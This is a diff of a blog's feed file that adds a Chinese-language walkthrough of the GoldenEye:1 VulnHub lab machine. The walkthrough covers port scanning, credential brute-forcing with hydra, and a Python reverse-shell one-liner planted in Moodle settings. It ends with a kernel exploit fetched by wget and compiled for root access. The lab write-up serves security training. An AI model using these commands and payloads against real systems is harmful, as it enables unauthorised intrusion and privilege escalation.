@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>GoldenEye-1</title>
+      <link href="/posts/GoldenEye-1/"/>
+      <url>/posts/GoldenEye-1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>GoldenEye:1</h1><hr><p>来源: <a href="https://www.vulnhub.com/entry/goldeneye-1,240/">vulnhub靶场-Goldeneye:1</a></p><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>攻击机(kali): 192.168.56.6</p><p>靶机(ubuntu): 192.168.56.101</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>我还是第一次看到nmap的<code>-A</code>会漏掉端口的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.56.101</span><br><span class="line">nmap -A 192.168.56.101</span><br><span class="line">nmap -p 55006,55007 -A 192.168.56.101</span><br></pre></td></tr></table></figure><p>详细信息如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">25/tcp    open  smtp</span><br><span class="line">80/tcp    open  http Apache/2.4.7</span><br><span class="line">55006/tcp open  ssl/pop3</span><br><span class="line">55007/tcp open  pop3</span><br></pre></td></tr></table></figure><p>访问80端口, 要求我们去<code>/sev-home/</code>去登录, 没有账号密码贸然爆破不可取, 遂翻找源代码</p><p>就只有一个<code>terminal.js</code>, 注释中透露了一些账号密码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Boris, make sure you update your default password. </span></span><br><span class="line"><span class="comment">//My sources say MI6 maybe planning to infiltrate. </span></span><br><span class="line"><span class="comment">//Be on the lookout for any suspicious network traffic....</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//I encoded you p@ssword below...</span></span><br><span class="line"><span class="comment">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"><span class="comment">//BTW Natalya says she can break your codes</span></span><br></pre></td></tr></table></figure><p>此处是ascii码, 对照表可以翻译为<code>InvincibleHack3r</code>, 至此可以得到账号密码:</p><blockquote><p>boris : InvincibleHack3r</p><p>natalya : null</p></blockquote><p>登录可以得到一段话, 这里只取部分, 结合扫描结果, 我们需要去对应端口看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port</span><br></pre></td></tr></table></figure><p>需要登录, 但是我们并不知道boris的默认密码和natalya的密码, 那只能尝试爆破了:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &#x27;natalya\nboris&#x27; &gt; test.txt</span><br><span class="line">hydra -L test.txt -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 -s 55007 pop3</span><br></pre></td></tr></table></figure><p>这个字典是自带的, 跑的比较快, 虽然用自己的也能跑出来</p><p>我们得到pop3登录账密:</p><blockquote><p>boris : secret1!</p><p>natalya : bird</p></blockquote><p>利用telnet或者nc登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 192.168.56.101 55007</span><br><span class="line"># 或者 nc 192.168.56.101 55007</span><br><span class="line">user boris</span><br><span class="line">pass secrct1!</span><br><span class="line">list</span><br><span class="line">retr 1</span><br><span class="line"># 参数1-3</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905121111449.png" alt="image-20240905121111449"></p><p>在boris的邮件3中我们可已得到以下信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Place them in a hidden file within the root directory of this server</span><br><span class="line"># 服务器root路径下有一个access codes</span><br><span class="line">Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal</span><br><span class="line">codes we will push to our final stages</span><br><span class="line"># 可能有一个新的用户xenia, 而且可能有更多的权限(推向最后阶段)</span><br></pre></td></tr></table></figure><p>在natalya的邮件2中可得:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:xenia</span><br><span class="line">password:RCP90rulez!</span><br><span class="line">And if you didn’t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span><br><span class="line">Make sure to edit your host file since you usually work remote off-network…</span><br><span class="line">Since you’re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br><span class="line"># 我们需要修改host文件然后访问 severnaya-station.com/gnocertdir</span><br></pre></td></tr></table></figure><p>修改hosts文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.56.101 severnaya-station.com    </span><br></pre></td></tr></table></figure><p>去<code>severnaya-station.com/gnocertdir</code>利用账密登录, 可以找到一个欢迎信息来自Doak</p><p>而在<code>My profile -&gt; Messages</code>可以找到Dr. Doak的信件, 可以得到一个邮箱的用户名为doak, 没有密码就爆破</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905143437642.png" alt="image-20240905143437642"></p><p>登录邮件系统可以得到新的账号密码: <code>dr_doak : 4England!</code></p><p>拿去登录网站, 可以在<code>My profile-&gt;My private files</code>的for james文件夹中找到s3cret.txt, 可以下载下来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.</span><br><span class="line"></span><br><span class="line">Something juicy is located here: /dir007key/for-007.jpg</span><br></pre></td></tr></table></figure><p>暗示admin的密码在新的路径: <code>/dir007key/for-007.jpg</code>, 是个图片, 那大概率是藏了什么</p><p>在属性界面找到了base64编码, 解码出来是<code>xWinter1995x!</code>, 那么这个就是管理员的密码了</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905150434809.png" alt="image-20240905150434809"></p><p>成功进入有权限的后台, 下一步就是getshell了</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>写马或者利用框架漏洞拿到服务器的shell</p><p>网站框架为moodle, msf有现成的利用模块, 也可以手工利用</p><blockquote><p>我的msf不是很好用捏</p><p>payload导入有些麻烦</p></blockquote><p>首先更改设置:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905174027958.png" alt="image-20240905174027958"></p><p>然后在配置中写入反弹shell代码:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.6&quot;,10000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905175441537.png" alt="image-20240905175441537"></p><p>先利用nc监听端口, 然后找到一个能发送数据包出去的地方, 能发送邮件的地方就不错, 点击那个钩就行了</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905175852742.png" alt="image-20240905175852742"></p><p>成功后执行<code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code>开一个新的交互shell</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><blockquote><p>因为要进入root文件夹, 只能提权</p></blockquote><p>先查看服务器有哪些东西</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># www-data</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>没有gcc环境, 但是有cc环境</p><p>查看内核并查找对应的提权方法/漏洞, 找到37292.c, 复制下来准备编译</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 网络搜索:  Linux ubuntu 3.13.0-32 exploit</span></span><br><span class="line"><span class="comment"># 或者kali查找脚本: </span></span><br><span class="line">searchsploit ubuntu 3.13</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905182736391.png" alt="image-20240905182736391"></p><p>由于目标主机没有gcc环境, 这里需要改我们复制下来的脚本: 将第143行的gcc改为cc</p><blockquote><p>直接输入143gg就会跳转到143行</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905183320128.png" alt="image-20240905183320128"></p><p>然后开启http服务让靶机下载改过的文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">python3 -m http.server 6789</span><br><span class="line"><span class="comment"># 靶机</span></span><br><span class="line">wget http://192.168.56.6:6789/37292.c</span><br><span class="line">cc -o exp 37292.c</span><br><span class="line"><span class="built_in">chmod</span> +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905184209668.png" alt="image-20240905184209668"></p><p>可以看到是成功提权, 在<code>.flag.txt</code>找到了codes和flag地址, 访问即可得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alec told me to place the codes here: </span><br><span class="line"></span><br><span class="line">568628e0d993b1973adc718237da6e93</span><br><span class="line"></span><br><span class="line">If you captured this make sure to go here.....</span><br><span class="line">/006-final/xvf7-flag/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905184627870.png" alt="image-20240905184627870"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><p>信息收集总结如下</p><ul><li><p>目标kali: 192.168.56.6ubuntu:  192.168.56.101port: 25 80 55006 55007</p></li><li><p>域名<a href="http://severnaya-station.com">severnaya-station.com</a></p></li><li><p>账密web:boris : InvincibleHack3rnatalya : null</p><p>pop3:boris : secret1!natalya : birddoak : goat</p><p>web/gnocertdir :xenia : RCP90rulez!dr_doak : 4England!admin : xWinter1995x!</p></li><li><p>重要信息root中access code: 568628e0d993b1973adc718237da6e93</p></li><li><p>身份boris: user,员工natalya: GNO培训主管xenia: natalya学生, 网站账户doak: 员工,高管james: 特工</p></li><li><p>其他关联Janus: 犯罪集团</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> msf </tag>
+            
+            <tag> 提权 </tag>
+            
+            <tag> 爆破 </tag>
+            
+            <tag> Linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Web入门_反序列化</title>
       <link href="/posts/ctfshow-webbasic-unserialize/"/>
       <url>/posts/ctfshow-webbasic-unserialize/</url>
@@ -213,9 +244,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> SQL </tag>
-            
             <tag> RCE </tag>
+            
+            <tag> SQL </tag>
             
             <tag> SQL盲注 </tag>
             
@@ -494,11 +525,11 @@
       
         <tags>
             
+            <tag> 爆破 </tag>
+            
             <tag> PHP </tag>
             
             <tag> 工具利用 </tag>
-            
-            <tag> 爆破 </tag>
             
         </tags>
       
@@ -595,11 +626,11 @@
       
         <tags>
             
+            <tag> Linux </tag>
+            
             <tag> 内网 </tag>
             
             <tag> 工具利用 </tag>
-            
-            <tag> Linux </tag>
             
             <tag> Windows </tag>
             
@@ -626,9 +657,9 @@
       
         <tags>
             
-            <tag> 内网 </tag>
-            
             <tag> msf </tag>
+            
+            <tag> 内网 </tag>
             
             <tag> 工具利用 </tag>
             
@@ -686,11 +717,11 @@
       
         <tags>
             
+            <tag> msf </tag>
+            
             <tag> Kali </tag>
             
             <tag> 内网 </tag>
-            
-            <tag> msf </tag>
             
         </tags>
       
@@ -715,13 +746,13 @@
       
         <tags>
             
+            <tag> msf </tag>
+            
             <tag> Kali </tag>
             
             <tag> 内网 </tag>
             
             <tag> cs </tag>
-            
-            <tag> msf </tag>
             
         </tags>
       
@@ -746,13 +777,13 @@
       
         <tags>
             
+            <tag> msf </tag>
+            
             <tag> Kali </tag>
             
             <tag> 内网 </tag>
             
             <tag> cs </tag>
-            
-            <tag> msf </tag>
             
         </tags>
       
@@ -777,11 +808,11 @@
       
         <tags>
             
+            <tag> msf </tag>
+            
             <tag> Kali </tag>
             
             <tag> 内网 </tag>
-            
-            <tag> msf </tag>
             
         </tags>
       
@@ -1001,9 +1032,9 @@
       
         <tags>
             
-            <tag> Kali </tag>
-            
             <tag> msf </tag>
+            
+            <tag> Kali </tag>
             
         </tags>
       
